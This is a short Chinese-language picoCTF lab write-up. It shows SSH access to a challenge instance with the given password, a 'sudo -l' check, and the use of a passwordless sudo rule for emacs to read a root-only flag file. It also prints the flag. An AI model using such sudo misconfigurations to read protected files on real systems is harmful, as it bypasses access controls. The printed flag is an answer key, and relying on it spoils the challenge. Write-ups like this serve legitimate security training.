## 題目

https://learn.cylabacademy.org/library/735?page=1&category=5

Can you read the flag? I think you can!


## 解題

>[sudo](../../筆記/sudo.md)

Launch Instance 後：

`ssh -p 56888 [ctf-player@green-hill.picoctf.net](mailto:ctf-player@green-hill.picoctf.net)` using password `d1a1ff7a`

故接下來使用 `ssh` 進行連線：

```bash
ssh -p 56888 ctf-player@green-hill.picoctf.net
```

並輸入 `yes` 與密碼 `d1a1ff7a` 即可連線。

先使用 `ls -al` 查看檔案：

```bash
ls -al
total 16
drwxr-xr-x 1 ctf-player ctf-player   20 Sep 22 14:17 .
drwxr-xr-x 1 root       root         24 Mar  9  2026 ..
-rw-r--r-- 1 ctf-player ctf-player  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ctf-player ctf-player 3771 Feb 25  2020 .bashrc
drwx------ 2 ctf-player ctf-player   34 Sep 22 14:17 .cache
-rw-r--r-- 1 ctf-player ctf-player  807 Feb 25  2020 .profile
-r--r----- 1 root       root         31 Mar  9  2026 flag.txt
```

若直接 `cat flag.txt` ，會發現沒有權限：

```bash
cat flag.txt 
cat: flag.txt: Permission denied
```

先查看自己可以使用哪些 sudo 命令：

```bash
sudo -l
```

輸出：

```bash
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
```

發現 `emacs` 可以使用，故：

```bash
sudo emacs flag.txt
```

輸入密碼 `d1a1ff7a` ，然後就可以看到 flag :  

```bash
picoCTF{ju57_5ud0_17_0cdfe631}
```